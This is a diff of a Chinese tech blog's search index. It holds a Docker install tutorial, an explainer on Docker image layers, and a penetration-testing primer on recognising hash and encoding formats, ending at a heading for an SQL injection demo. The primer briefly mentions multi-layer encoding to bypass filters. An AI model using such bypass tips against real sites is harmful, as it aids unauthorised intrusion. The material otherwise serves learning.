+<h1 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h1><h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><ul>
+<li><p>需要Linux基础</p>
 </li>
-<li><p>朋友拷贝给你</p>
+<li><p>CentOS7</p>
 </li>
-<li><p>自己制作一个镜像DockerFile</p>
+<li><p>使用XShell等连接远程服务器进行操作</p>
 </li>
 </ul>
-<h1 id="二、Docker镜像加载原理"><a href="#二、Docker镜像加载原理" class="headerlink" title="二、Docker镜像加载原理"></a>二、Docker镜像加载原理</h1><h2 id="1、UnionFS（联合文件系统）"><a href="#1、UnionFS（联合文件系统）" class="headerlink" title="1、UnionFS（联合文件系统）"></a>1、UnionFS（联合文件系统）</h2><p>&emsp;&emsp;UnionFS (联合文件系统) : Union文件系统( UnionFS)是一种分层、 轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directories into a single virtual filesystem）。Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像）,可以制作各种具体的应用镜像。</p>
-<p>&emsp;&emsp;特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录</p>
-<p>&emsp;&emsp;我们下载镜像的时候看到的一层层就是这个</p>
-<h2 id="2、Docker镜像加载原理"><a href="#2、Docker镜像加载原理" class="headerlink" title="2、Docker镜像加载原理"></a>2、Docker镜像加载原理</h2><p>&emsp;&emsp;Docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。</p>
-<p>&emsp;&emsp;BootFS（Boot File System）主要包含bootloader和kernel，bootloader主要是引|导加载kernel，Linux刚启动时会加载BootFS文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由BootFS转交给内核，此时系统也会卸载bootfs.</p>
-<p>&emsp;&emsp;RootFS (Root File System) ，在bootfs之上。包含的就是典型Linux 系统中的/dev， /proc， /bin， /etc等标准目录和文件。RootFS就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378194134-f0a43a44-9cb2-42da-9175-edcc615c4fe6.png" alt="img"></p>
-<p>&emsp;&emsp;平时我们安装进虚拟机的CentOS都是好几个G，为什么Docker这里才200M？</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378258217-0d43a7c0-6a45-4f54-a4ee-30bfba0c7b89.png" alt="img"></p>
-<p>&emsp;&emsp;对于一个精简的OS，RootfFS可以很小，只需要包含最基本的命令，工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供RootFS就可以了。由此可见对于不同的linux发行版，BootFS基本是一致的，RootFS会有差别，因此不同的发行版可以公用BootFS。</p>
-<h2 id="3、分层理解"><a href="#3、分层理解" class="headerlink" title="3、分层理解"></a>3、分层理解</h2><h3 id="（1）分层的镜像"><a href="#（1）分层的镜像" class="headerlink" title="（1）分层的镜像"></a>（1）分层的镜像</h3><p>&emsp;&emsp;我们可以去下载一个镜像，注意观察下载的日志输出，可以看到是一层一层的在下载！</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378524848-56f34cbd-f790-4491-bdd2-420762fb2cc0.png" alt="img"></p>
-<p>&emsp;&emsp;思考：为什么Docker镜像要采用这种分层的结构呢？</p>
-<p>&emsp;&emsp;最大的好处，我觉得莫过于是资源共享了！比如有多个镜像都从相同的Base镜像构建而来，那么宿主机只需在磁盘上保留一份base镜像，同时内存中也只需要加载一份base镜像，这样就可以为所有的容器服务了，且镜像的每一层都可以被共享。</p>
-<p>&emsp;&emsp;查看镜像分层的方式可以通过<code>docker image inspect 镜像名</code>命令！</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379789310-2a328dcd-b855-4773-aa75-f440c93564d7.png" alt="img"></p>
-<h3 id="（2）理解"><a href="#（2）理解" class="headerlink" title="（2）理解"></a>（2）理解</h3><p>&emsp;&emsp;所有的Docker镜像都起始于一个基础镜像层，当进行修改或增加新的内容时，就会在当前镜像层之上，创建新的镜像层。</p>
-<p>&emsp;&emsp;举一个简单的例子，假如基于Ubuntu Linux 16.04创建一个新的镜像，这就是新镜像的第一层；如果在该镜像中添加Python包，就会在基础镜像层之上创建第二个镜像层；如果继续添加一个安全补丁，就会创建第三个镜像层。</p>
-<p>&emsp;&emsp;该镜像当前已经包含3个镜像层，如下图所示（这只是一个用于演示的很简单的例子）</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379931355-662a173d-b5ac-4619-b929-442a4c543d46.png" alt="img"></p>
-<p>&emsp;&emsp;在添加额外的镜像层的同时,镜像始终保持是当前所有镜像的组合，理解这一点点常重要。 图中举了一个简单的例子，每个镜像包含3个文件，而镜像包含了来自两个镜像层的6个文件。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379992732-33c35650-e3dc-4a97-bb5e-39ab82693187.png" alt="img"></p>
-<p>&emsp;&emsp;上图中的镜像层跟之前图中的略有区别，主要目的是便于展示文件。下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有6个文件，这是因为最上层中的文件7是文件5的一个更新版本。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380069106-5f074aae-bb2e-40aa-b8ba-07430052ebe6.png" alt="img"></p>
-<p>&emsp;&emsp;这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到镜像当中。</p>
-<p>&emsp;&emsp;Docker通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈,，保证多镜像层对外展示为统一的文件系统。</p>
-<p>&emsp;&emsp;Linux上可用的存储引擎有AUFS、Overlay2、Device Mapper、Btrfs以及ZFS。顾名思义，每种存储引擎都基于Linux中对应的文件系统或者块设备技术，并且每种存储引擎擎都有其独有的性能特点。</p>
-<p>&emsp;&emsp;Docker在Windows上仅支持windowsfilter一种存储引擎，该引擎基于NTFS文件系统之上实现了分层和CoW[1]。</p>
-<p>&emsp;&emsp;下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供统一的视图。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380496024-abad9527-7903-4fc7-a9ed-a7874baa30b8.png" alt="img"></p>
-<h3 id="（3）特点"><a href="#（3）特点" class="headerlink" title="（3）特点"></a>（3）特点</h3><p>&emsp;&emsp;Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部！</p>
-<p>&emsp;&emsp;这一层就是我们通常说的容器层，容器之下的都叫镜像层！</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380628445-60392a4a-a129-45e5-a53a-050579f46cd0.png" alt="img"></p>
+<h2 id="2、环境查看"><a href="#2、环境查看" class="headerlink" title="2、环境查看"></a>2、环境查看</h2><p>&emsp;&emsp;<code>uname -r</code>     #可以看到系统内核是3.0以上的（根据目前最新版本的Docker最好用3.0以上的）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630190998027-5178b78c-86a9-4d77-9e6d-58e9c47ef1bc.png" alt="img"></p>
+<p>&emsp;&emsp;<code>cat /etc/os-release</code>    #操作系统版本等信息，可以看到为CentOS7</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191045289-d8e49bd7-1e5f-445e-8a15-887b4c23a23a.png" alt="img"></p>
+<h2 id="3、安装"><a href="#3、安装" class="headerlink" title="3、安装"></a>3、安装</h2><p>&emsp;&emsp;查看帮助文档</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191257923-ca08032d-432d-453b-b306-0536f273e86d.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191291748-ec54e317-e612-4404-a188-93e32caba267.png" alt="img"></p>
+<h3 id="（1）卸载旧的版本"><a href="#（1）卸载旧的版本" class="headerlink" title="（1）卸载旧的版本"></a>（1）卸载旧的版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191459582-c6298c53-8019-49e0-aa05-3ed98add9b91.png" alt="img"></p>
+<h3 id="（2）需要的安装包"><a href="#（2）需要的安装包" class="headerlink" title="（2）需要的安装包"></a>（2）需要的安装包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br></pre></td></tr></table></figure>
+
+<h3 id><a href="#" class="headerlink" title></a><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630192978202-9ea6b98b-6354-41dc-83cb-8a668a6fe77f.png" alt="img"></h3><h3 id="（3）设置镜像的仓库"><a href="#（3）设置镜像的仓库" class="headerlink" title="（3）设置镜像的仓库"></a>（3）设置镜像的仓库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo   #默认是国外的</span><br><span class="line"><span class="meta">#</span><span class="bash">建议用国内的，这里用了阿里云的</span></span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193327326-54bbb9ee-11b0-4d51-bd3e-0dfd8b5207ba.png" alt="img"></p>
+<h3 id="（4）更新yum软件包索引（文档并没有，但是推荐先这样做）"><a href="#（4）更新yum软件包索引（文档并没有，但是推荐先这样做）" class="headerlink" title="（4）更新yum软件包索引（文档并没有，但是推荐先这样做）"></a>（4）更新yum软件包索引（文档并没有，但是推荐先这样做）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum makecache fast</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193742930-52d2c07c-00a5-44b7-a3d6-608b84ca0bbd.png" alt="img"></p>
+<h3 id="（5）安装Docker相关依赖（docker-ce-社区版-ee-企业版）"><a href="#（5）安装Docker相关依赖（docker-ce-社区版-ee-企业版）" class="headerlink" title="（5）安装Docker相关依赖（docker-ce 社区版  ee 企业版）"></a>（5）安装Docker相关依赖（docker-ce 社区版  ee 企业版）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta">#</span><span class="bash">可以使用docker version命令查看是否安装成功</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193895408-06452251-6f2b-4b08-a74b-58df248e2597.png" alt="img"></p>
+<h3 id="（6）启动Docker"><a href="#（6）启动Docker" class="headerlink" title="（6）启动Docker"></a>（6）启动Docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
+
+<h3 id="（7）运行hello-world"><a href="#（7）运行hello-world" class="headerlink" title="（7）运行hello-world"></a>（7）运行hello-world</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630194278515-365cb481-1185-4483-a8bf-4d29f18e2ffa.png" alt="img"></p>
+<h3 id="（8）查看下载的hello-world镜像"><a href="#（8）查看下载的hello-world镜像" class="headerlink" title="（8）查看下载的hello-world镜像"></a>（8）查看下载的hello-world镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images   </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630194342773-168e10b3-0461-4293-8147-a4c3b044dc3f.png" alt="img"></p>
+<h2 id="4、卸载Docker（了解）"><a href="#4、卸载Docker（了解）" class="headerlink" title="4、卸载Docker（了解）"></a>4、卸载Docker（了解）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1、卸载依赖</span></span><br><span class="line">sudo yum remove docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2、删除资源</span></span><br><span class="line">sudo rm -rf /var/lib/docker   # /var/lib/docker 为Docker的默认工作路径</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、回顾hello-world流程"><a href="#三、回顾hello-world流程" class="headerlink" title="三、回顾hello-world流程"></a>三、回顾hello-world流程</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630195539318-3872e867-2f1d-4109-8891-81ca87e72d0e.png" alt="img"></p>
+<h1 id="四、底层原理"><a href="#四、底层原理" class="headerlink" title="四、底层原理"></a>四、底层原理</h1><h2 id="1、Docker是怎么工作的"><a href="#1、Docker是怎么工作的" class="headerlink" title="1、Docker是怎么工作的"></a>1、Docker是怎么工作的</h2><p>&emsp;&emsp;Docker是一个Client-Server结构的系统，Docker的守护进程运行在主机上，通过Socket从客户端访问。</p>
+<p>&emsp;&emsp;DockerServer接收到Docker-Client的指令，就会执行这个命令</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630196704765-f6761549-9aca-4a85-b1b8-6ba89161125a.png" alt="img"></p>
+<h2 id="2、Docker为什么比VM快"><a href="#2、Docker为什么比VM快" class="headerlink" title="2、Docker为什么比VM快"></a>2、Docker为什么比VM快</h2><p>&emsp;&emsp;Docker有着比虚拟机更少的抽象层</p>
+<p>&emsp;&emsp;Docker利用的是宿主机的内核，VM需要是Guset OS</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630197561993-9b8796b3-5854-4163-a8a5-c5ee38d9caba.jpeg" alt="img"></p>
+<p>&emsp;&emsp;所以说，新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载Guest OS，分钟级别的，而Docker是利用宿主机的操作系统，省略了这个复杂的过程，秒级！</p>
 ]]></content>
+      <categories>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
   </entry>
   <entry>
     <title>docker常用命令</title>
@@ -2381,6 +2331,55 @@
       </tags>
   </entry>
   <entry>
+    <title>docker镜像讲解</title>
+    <url>/post/9e39f1c0.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、镜像是什么"><a href="#一、镜像是什么" class="headerlink" title="一、镜像是什么"></a>一、镜像是什么</h1><p>&emsp;&emsp;镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p>
+<p>&emsp;&emsp;所有的应用，直接打包docker镜像，就可以直接跑起来</p>
+<p>&emsp;&emsp;如何得到镜像：</p>
+<ul>
+<li><p>从远程仓库下载</p>
+</li>
+<li><p>朋友拷贝给你</p>
+</li>
+<li><p>自己制作一个镜像DockerFile</p>
+</li>
+</ul>
+<h1 id="二、Docker镜像加载原理"><a href="#二、Docker镜像加载原理" class="headerlink" title="二、Docker镜像加载原理"></a>二、Docker镜像加载原理</h1><h2 id="1、UnionFS（联合文件系统）"><a href="#1、UnionFS（联合文件系统）" class="headerlink" title="1、UnionFS（联合文件系统）"></a>1、UnionFS（联合文件系统）</h2><p>&emsp;&emsp;UnionFS (联合文件系统) : Union文件系统( UnionFS)是一种分层、 轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directories into a single virtual filesystem）。Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像）,可以制作各种具体的应用镜像。</p>
+<p>&emsp;&emsp;特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录</p>
+<p>&emsp;&emsp;我们下载镜像的时候看到的一层层就是这个</p>
+<h2 id="2、Docker镜像加载原理"><a href="#2、Docker镜像加载原理" class="headerlink" title="2、Docker镜像加载原理"></a>2、Docker镜像加载原理</h2><p>&emsp;&emsp;Docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。</p>
+<p>&emsp;&emsp;BootFS（Boot File System）主要包含bootloader和kernel，bootloader主要是引|导加载kernel，Linux刚启动时会加载BootFS文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由BootFS转交给内核，此时系统也会卸载bootfs.</p>
+<p>&emsp;&emsp;RootFS (Root File System) ，在bootfs之上。包含的就是典型Linux 系统中的/dev， /proc， /bin， /etc等标准目录和文件。RootFS就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378194134-f0a43a44-9cb2-42da-9175-edcc615c4fe6.png" alt="img"></p>
+<p>&emsp;&emsp;平时我们安装进虚拟机的CentOS都是好几个G，为什么Docker这里才200M？</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378258217-0d43a7c0-6a45-4f54-a4ee-30bfba0c7b89.png" alt="img"></p>
+<p>&emsp;&emsp;对于一个精简的OS，RootfFS可以很小，只需要包含最基本的命令，工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供RootFS就可以了。由此可见对于不同的linux发行版，BootFS基本是一致的，RootFS会有差别，因此不同的发行版可以公用BootFS。</p>
+<h2 id="3、分层理解"><a href="#3、分层理解" class="headerlink" title="3、分层理解"></a>3、分层理解</h2><h3 id="（1）分层的镜像"><a href="#（1）分层的镜像" class="headerlink" title="（1）分层的镜像"></a>（1）分层的镜像</h3><p>&emsp;&emsp;我们可以去下载一个镜像，注意观察下载的日志输出，可以看到是一层一层的在下载！</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378524848-56f34cbd-f790-4491-bdd2-420762fb2cc0.png" alt="img"></p>
+<p>&emsp;&emsp;思考：为什么Docker镜像要采用这种分层的结构呢？</p>
+<p>&emsp;&emsp;最大的好处，我觉得莫过于是资源共享了！比如有多个镜像都从相同的Base镜像构建而来，那么宿主机只需在磁盘上保留一份base镜像，同时内存中也只需要加载一份base镜像，这样就可以为所有的容器服务了，且镜像的每一层都可以被共享。</p>
+<p>&emsp;&emsp;查看镜像分层的方式可以通过<code>docker image inspect 镜像名</code>命令！</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379789310-2a328dcd-b855-4773-aa75-f440c93564d7.png" alt="img"></p>
+<h3 id="（2）理解"><a href="#（2）理解" class="headerlink" title="（2）理解"></a>（2）理解</h3><p>&emsp;&emsp;所有的Docker镜像都起始于一个基础镜像层，当进行修改或增加新的内容时，就会在当前镜像层之上，创建新的镜像层。</p>
+<p>&emsp;&emsp;举一个简单的例子，假如基于Ubuntu Linux 16.04创建一个新的镜像，这就是新镜像的第一层；如果在该镜像中添加Python包，就会在基础镜像层之上创建第二个镜像层；如果继续添加一个安全补丁，就会创建第三个镜像层。</p>
+<p>&emsp;&emsp;该镜像当前已经包含3个镜像层，如下图所示（这只是一个用于演示的很简单的例子）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379931355-662a173d-b5ac-4619-b929-442a4c543d46.png" alt="img"></p>
+<p>&emsp;&emsp;在添加额外的镜像层的同时,镜像始终保持是当前所有镜像的组合，理解这一点点常重要。 图中举了一个简单的例子，每个镜像包含3个文件，而镜像包含了来自两个镜像层的6个文件。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379992732-33c35650-e3dc-4a97-bb5e-39ab82693187.png" alt="img"></p>
+<p>&emsp;&emsp;上图中的镜像层跟之前图中的略有区别，主要目的是便于展示文件。下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有6个文件，这是因为最上层中的文件7是文件5的一个更新版本。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380069106-5f074aae-bb2e-40aa-b8ba-07430052ebe6.png" alt="img"></p>
+<p>&emsp;&emsp;这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到镜像当中。</p>
+<p>&emsp;&emsp;Docker通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈,，保证多镜像层对外展示为统一的文件系统。</p>
+<p>&emsp;&emsp;Linux上可用的存储引擎有AUFS、Overlay2、Device Mapper、Btrfs以及ZFS。顾名思义，每种存储引擎都基于Linux中对应的文件系统或者块设备技术，并且每种存储引擎擎都有其独有的性能特点。</p>
+<p>&emsp;&emsp;Docker在Windows上仅支持windowsfilter一种存储引擎，该引擎基于NTFS文件系统之上实现了分层和CoW[1]。</p>
+<p>&emsp;&emsp;下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供统一的视图。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380496024-abad9527-7903-4fc7-a9ed-a7874baa30b8.png" alt="img"></p>
+<h3 id="（3）特点"><a href="#（3）特点" class="headerlink" title="（3）特点"></a>（3）特点</h3><p>&emsp;&emsp;Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部！</p>
+<p>&emsp;&emsp;这一层就是我们通常说的容器层，容器之下的都叫镜像层！</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380628445-60392a4a-a129-45e5-a53a-050579f46cd0.png" alt="img"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>pyautogui模块</title>
     <url>/post/2681d601.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、GUI控制功能"><a href="#一、GUI控制功能" class="headerlink" title="一、GUI控制功能"></a>一、GUI控制功能</h1><ul>
@@ -2687,6 +2686,95 @@
       </tags>
   </entry>
   <entry>
+    <title>加密编码算法</title>
+    <url>/post/57602181.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&emsp;&emsp;在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展</p>
+<h1 id="二、常见加密编码等算法解析"><a href="#二、常见加密编码等算法解析" class="headerlink" title="二、常见加密编码等算法解析"></a>二、常见加密编码等算法解析</h1><p>&emsp;&emsp;MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</p>
+<h2 id="1、MD5（不可逆）"><a href="#1、MD5（不可逆）" class="headerlink" title="1、MD5（不可逆）"></a>1、MD5（不可逆）</h2><p>&emsp;&emsp;16位和32位，加密密文字符串由A-F,0-9随机分配，80%网站管理员或用户密码加采取MD5加密。(不可逆)</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631426676161-c5207f4e-1428-47ce-9010-f80620b3d40b.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631426783155-a2d53afe-f8c2-4f8e-b5f8-fedc743a8f62.png" alt="img"></p>
+<p>&emsp;&emsp;网上的MD5在线工具，它的解密过程是用了枚举方法</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295062-a4e72231-36a0-4be4-ac79-0340fa3d17e8.png" alt="img"></p>
+<h2 id="2、SHA"><a href="#2、SHA" class="headerlink" title="2、SHA"></a>2、SHA</h2><p>&emsp;&emsp;由A-Z，0-9随机组合，SHA1，SHA256，SHA384，SHA512长度固定。(不可逆）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295136-57840de0-5012-4b7c-ac74-2d1c97e41211.png" alt="img"></p>
+<h2 id="3、进制"><a href="#3、进制" class="headerlink" title="3、进制"></a>3、进制</h2><p>&emsp;&emsp;16进制加密</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631427004811-2c9cc3e6-d6b8-4db1-8390-0cb09922eed0.png" alt="img"></p>
+<h2 id="4、Unix时间戳"><a href="#4、Unix时间戳" class="headerlink" title="4、Unix时间戳"></a>4、Unix时间戳</h2><p>&emsp;&emsp;网站或者服务器脚本语言里经常会使用，会在数据库里用户登录和注销，注册里会使用</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631427097207-92187c11-18a6-4402-8ccf-b6affe403e15.png" alt="img"></p>
+<h2 id="5、URL"><a href="#5、URL" class="headerlink" title="5、URL"></a>5、URL</h2><p>&emsp;&emsp;浏览器只做一次加密，在渗透绕过的时候可能会使用二次，三次加密方式</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295291-0cc7eda4-7dac-4031-b66a-d5aef5655877.png" alt="img"></p>
+<h2 id="6、Base64"><a href="#6、Base64" class="headerlink" title="6、Base64"></a>6、Base64</h2><p>&emsp;&emsp;大小写随机组合，在字符串后面经常出现一个或两个等号</p>
+<p>&emsp;&emsp;明文越长，密文越长</p>
+<p>&emsp;&emsp;常见应用：代码、密码、参数</p>
+<p>&emsp;&emsp;浏览器只做一次加密，在渗透绕过的时候可能会使用二次，三次加密方式</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295381-29bdb9b3-1184-4348-819c-b6394c52daaa.png" alt="img"></p>
+<h2 id="7、Unescape"><a href="#7、Unescape" class="headerlink" title="7、Unescape"></a>7、Unescape</h2><p>&emsp;&emsp;%u+4位数字，对应两位字符，主要应用WEB应用上</p>
+<p>&emsp;&emsp;当明文字符数量为单数时</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295457-6bfb19de-f1ec-4a1a-be5a-2115b676a88e.png" alt="img"></p>
+<p>&emsp;&emsp;为双数时，最后一个为%u0000</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631427823242-5d2fc701-ccfb-491a-8bc3-ec2c4d63a3a4.png" alt="img"></p>
+<p>&emsp;&emsp;通过单数和双数的比较也能侧面反映出，%u+4位数字对应两位字符</p>
+<h2 id="8、AES"><a href="#8、AES" class="headerlink" title="8、AES"></a>8、AES</h2><p>&emsp;&emsp;是一种安全的加密方式，涉及到密码，偏移量，数据块，填充，在加密时候涉及到4种随机性。解密难度大。用base64解密出来是乱码，有很大可能是AES加密。有时候/出现在字符串里面。比较注重安全和大型网站、安全比赛<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295532-b1755fc0-94ce-45c4-84a3-97f05db9b007.png" alt="img"></p>
+<h2 id="9、DES"><a href="#9、DES" class="headerlink" title="9、DES"></a>9、DES</h2><p>&emsp;&emsp;类似于BASE64，有时候+会出现字符串里</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009295607-6d69664a-ae6f-4bb8-91d2-d0a94097297a.png" alt="img"></p>
+<h1 id="三、常见加密形式算法解析"><a href="#三、常见加密形式算法解析" class="headerlink" title="三、常见加密形式算法解析"></a>三、常见加密形式算法解析</h1><p>&emsp;&emsp;直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p>
+<h1 id="四、常见解密方式（针对）"><a href="#四、常见解密方式（针对）" class="headerlink" title="四、常见解密方式（针对）"></a>四、常见解密方式（针对）</h1><p>&emsp;&emsp;枚举，自定义逆向算法，可逆向</p>
+<h1 id="五、了解常规加密算法的特性"><a href="#五、了解常规加密算法的特性" class="headerlink" title="五、了解常规加密算法的特性"></a>五、了解常规加密算法的特性</h1><p>&emsp;&emsp;长度位数，字符规律，代码分析，搜索获取等</p>
+<h1 id="六、演示案例"><a href="#六、演示案例" class="headerlink" title="六、演示案例"></a>六、演示案例</h1><h2 id="1、SQL注入漏洞测试（参数加密）"><a href="#1、SQL注入漏洞测试（参数加密）" class="headerlink" title="1、SQL注入漏洞测试（参数加密）"></a>1、SQL注入漏洞测试（参数加密）</h2><ol>
